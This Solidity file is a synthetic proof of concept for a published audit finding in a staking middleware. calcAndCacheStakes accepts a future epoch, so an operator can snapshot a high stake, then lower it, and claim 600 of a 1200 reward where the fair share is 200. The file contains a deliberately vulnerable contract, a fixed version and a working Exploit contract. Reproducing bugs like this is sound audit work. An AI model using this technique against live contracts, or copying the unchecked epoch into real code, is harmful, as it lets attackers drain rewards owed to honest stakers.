// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Suzaku AvalancheL1Middleware.calcAndCacheStakes — a future epoch can be cached
    (Cyfrin / 0kage, 7 July 2025, finding 61230).
    SYNTHETIC, cheatcode-free. One transaction, no warp inside run().
    calcAndCacheStakes does not require epoch <= getCurrentEpoch().
    The call snapshots today's stake into that future epoch. A later drop in
    stake does not change the cache, and the reward for the epoch uses it.
    Here the attacker caches 100, then drops to 20. The reward pool is 1200.
    The cached share is 600. The fair share on the live stake is 200.
    The fixed function ignores a future epoch, so the same claim pays 200. */

contract Token {
    string public constant name = "Reward";
    string public constant symbol = "RWD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Middleware {
    uint256 public constant EPOCH_DURATION = 7 days;
    uint48 public currentEpoch = 1;

    Token public reward;
    address public operatorA;
    address public operatorB;
    uint48 public lastEpochStart;

    mapping(address => uint256) public stakeOf;
    mapping(uint48 => mapping(uint96 => bool)) public totalStakeCached;
    mapping(uint48 => mapping(uint96 => mapping(address => uint256))) public operatorStakeCache;
    mapping(uint48 => mapping(uint96 => uint256)) public totalStakeCache;

    constructor(Token reward_) {
        reward = reward_;
    }

    function getCurrentEpoch() public view returns (uint48) {
        return currentEpoch;
    }

    function getEpochStartTs(uint48 epoch) public pure returns (uint48) {
        return epoch * uint48(EPOCH_DURATION);
    }

    function setOperators(address a, address b) external {
        operatorA = a;
        operatorB = b;
    }

    function setStake(address who, uint256 amount) external {
        stakeOf[who] = amount;
    }

    function calcAndCacheStakes(uint48 epoch, uint96 assetClassId) public returns (uint256 totalStake) {
        uint48 epochStartTs = getEpochStartTs(epoch); // No validation of epoch timing
        lastEpochStart = epochStartTs;
        // @> VULN: epoch is not checked against getCurrentEpoch, so today's stake is stored for a future epoch
        totalStakeCached[epoch][assetClassId] = true;
        operatorStakeCache[epoch][assetClassId][operatorA] = stakeOf[operatorA];
        operatorStakeCache[epoch][assetClassId][operatorB] = stakeOf[operatorB];
        totalStakeCache[epoch][assetClassId] = stakeOf[operatorA] + stakeOf[operatorB];
        totalStake = totalStakeCache[epoch][assetClassId];
    }

    function getOperatorStake(address operator, uint48 epoch, uint96 assetClassId) public view returns (uint256 stake) {
        if (totalStakeCached[epoch][assetClassId]) {
            uint256 cachedStake = operatorStakeCache[epoch][assetClassId][operator];
            return cachedStake;
        }
        return stakeOf[operator];
    }

    function getTotalStake(uint48 epoch, uint96 assetClassId) public view returns (uint256) {
        if (totalStakeCached[epoch][assetClassId]) {
            return totalStakeCache[epoch][assetClassId];
        }
        return stakeOf[operatorA] + stakeOf[operatorB];
    }

    function claim(address operator, uint48 epoch, uint96 assetClassId, uint256 rewardAmount) external returns (uint256 paid) {
        uint256 stake = getOperatorStake(operator, epoch, assetClassId);
        uint256 total = getTotalStake(epoch, assetClassId);
        paid = rewardAmount * stake / total;
        reward.transfer(operator, paid);
    }
}

contract MiddlewareFixed {
    uint256 public constant EPOCH_DURATION = 7 days;
    uint48 public currentEpoch = 1;

    Token public reward;
    address public operatorA;
    address public operatorB;

    mapping(address => uint256) public stakeOf;
    mapping(uint48 => mapping(uint96 => bool)) public totalStakeCached;
    mapping(uint48 => mapping(uint96 => mapping(address => uint256))) public operatorStakeCache;
    mapping(uint48 => mapping(uint96 => uint256)) public totalStakeCache;

    constructor(Token reward_) {
        reward = reward_;
    }

    function getCurrentEpoch() public view returns (uint48) {
        return currentEpoch;
    }

    function setOperators(address a, address b) external {
        operatorA = a;
        operatorB = b;
    }

    function setStake(address who, uint256 amount) external {
        stakeOf[who] = amount;
    }

    function calcAndCacheStakes(uint48 epoch, uint96 assetClassId) public returns (uint256 totalStake) {
        if (epoch > currentEpoch) return 0;
        totalStakeCached[epoch][assetClassId] = true;
        operatorStakeCache[epoch][assetClassId][operatorA] = stakeOf[operatorA];
        operatorStakeCache[epoch][assetClassId][operatorB] = stakeOf[operatorB];
        totalStakeCache[epoch][assetClassId] = stakeOf[operatorA] + stakeOf[operatorB];
        totalStake = totalStakeCache[epoch][assetClassId];
    }

    function getOperatorStake(address operator, uint48 epoch, uint96 assetClassId) public view returns (uint256) {
        if (totalStakeCached[epoch][assetClassId]) {
            return operatorStakeCache[epoch][assetClassId][operator];
        }
        return stakeOf[operator];
    }

    function getTotalStake(uint48 epoch, uint96 assetClassId) public view returns (uint256) {
        if (totalStakeCached[epoch][assetClassId]) return totalStakeCache[epoch][assetClassId];
        return stakeOf[operatorA] + stakeOf[operatorB];
    }

    function claim(address operator, uint48 epoch, uint96 assetClassId, uint256 rewardAmount) external returns (uint256 paid) {
        uint256 stake = getOperatorStake(operator, epoch, assetClassId);
        uint256 total = getTotalStake(epoch, assetClassId);
        paid = rewardAmount * stake / total;
        reward.transfer(operator, paid);
    }
}

contract Exploit {
    uint48 public constant FUTURE = 5;
    uint96 public constant CLASS = 1;
    uint256 public constant HIGH = 100 ether;
    uint256 public constant LOW = 20 ether;
    uint256 public constant HONEST_STAKE = 100 ether;
    uint256 public constant REWARD = 1200 ether;
    address public constant HONEST = address(0xB0B);

    Token public reward; // nonce 1
    Middleware public middleware; // nonce 2

    uint256 public fairShare;
    uint256 public paid;
    uint256 public cachedStake;

    constructor() {
        reward = new Token();
        middleware = new Middleware(reward);
    }

    function run() external {
        middleware.setOperators(address(this), HONEST);
        middleware.setStake(address(this), HIGH);
        middleware.setStake(HONEST, HONEST_STAKE);

        uint256 cachedTotal = middleware.calcAndCacheStakes(FUTURE, CLASS);
        middleware.setStake(address(this), LOW);

        cachedStake = middleware.getOperatorStake(address(this), FUTURE, CLASS);
        uint256 live = middleware.stakeOf(address(this));
        uint256 other = middleware.stakeOf(HONEST);
        fairShare = REWARD * live / (live + other);

        reward.mint(address(middleware), REWARD);
        paid = middleware.claim(address(this), FUTURE, CLASS, REWARD);
        middleware.claim(HONEST, FUTURE, CLASS, REWARD);

        require(middleware.getCurrentEpoch() == 1, "not a future epoch");
        require(cachedTotal == HIGH + HONEST_STAKE, "cache was not today's stake");
        require(cachedStake == HIGH, "cache did not keep 100");
        require(live == LOW, "live stake is not 20");
        require(fairShare == 200 ether, "fair share");
        require(paid == 600 ether, "attacker was not paid 600");
        require(paid > fairShare, "not above the fair share");
        require(reward.balanceOf(address(this)) == paid, "balance");
    }
}
